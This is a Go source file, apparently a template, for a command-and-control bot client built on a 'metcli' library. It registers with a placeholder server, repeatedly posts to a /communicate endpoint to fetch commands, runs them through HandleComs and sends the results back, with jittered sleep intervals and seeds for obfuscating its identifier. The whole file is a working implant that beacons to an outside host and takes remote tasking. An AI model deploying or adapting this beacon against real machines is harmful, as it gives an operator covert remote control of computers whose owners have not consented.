package main

import (
	"bytes"
	"github.com/degenerat3/metcli"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"time"
)

// SERV : server to call
var SERV = "&&SERV&&"

// MAGIC : the shared hex byte that will signify the start of each MAD payload
var MAGIC = []byte{0xAA}

// MAGICBYTE is the single byte (rather than a byte array)
var MAGICBYTE = MAGIC[0]

//MAGICSTR is the ascii representation of the magic byte
var MAGICSTR = "XXXXX" //string(MAGIC)

// MAGICTERM : the shared hex byte that will signify the end of each MAD payload
var MAGICTERM = []byte{0xAB}

// MAGICTERMBYTE is the single byte (rather than a byte array)
var MAGICTERMBYTE = MAGICTERM[0]

//MAGICTERMSTR is the ascii representation of the magic byte
var MAGICTERMSTR = "YYYYY" //string(MAGICTERM)

//REGFILE is where the registration info for this bot is kept
var REGFILE = "&&REGFILE&&"

//INTERVAL is how long the sleep is between callbacks (if run in loop mode)
var INTERVAL = &&INTERVAL&&

//DELTA is the +/- variance in interval time
var DELTA = &&DELTA&&

//OBFSEED is the seed int that will get used for uuid obfuscation
var OBFSEED = 5

//OBFTEXT is the seed text that will get used for uuid obfuscation
var OBFTEXT = "&&OBFTEXT&&"

func postPayload(data string, m metcli.Metclient) string {
	url := SERV + "/communicate"
	prejson := `{"comms":"` + data + `"}`
	jsonStr := []byte(prejson)
	cli := http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	if err != nil {
		return "Error"
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := cli.Do(req)
	if err != nil {
		return "Error: Unable to reach server"
	}
	body, _ := ioutil.ReadAll(resp.Body)
	decBody := metcli.DecodePayload(string(body), m)
	return decBody
}

//run everything
func main() {
	argslen := len(os.Args)
	m := metcli.GenClient(SERV, MAGIC, MAGICSTR, MAGICTERM, MAGICTERMSTR, REGFILE, INTERVAL, DELTA, OBFSEED, OBFTEXT)

	for {
		p := metcli.PreCheck(m)
		if p != "registered" {
			postPayload(p, m)
		}
		comPL := metcli.GenGetComPL(m)
		comstr := postPayload(comPL, m)
		res := metcli.HandleComs(comstr, m)
		if len(res) > 0 {
			postPayload(res, m)
		}
		if argslen > 1 {
			os.Exit(0)
		}
		min := INTERVAL - DELTA
		max := INTERVAL + DELTA
		sleeptime := rand.Intn(max-min) + min
		time.Sleep(time.Duration(sleeptime) * time.Second)
	}

}
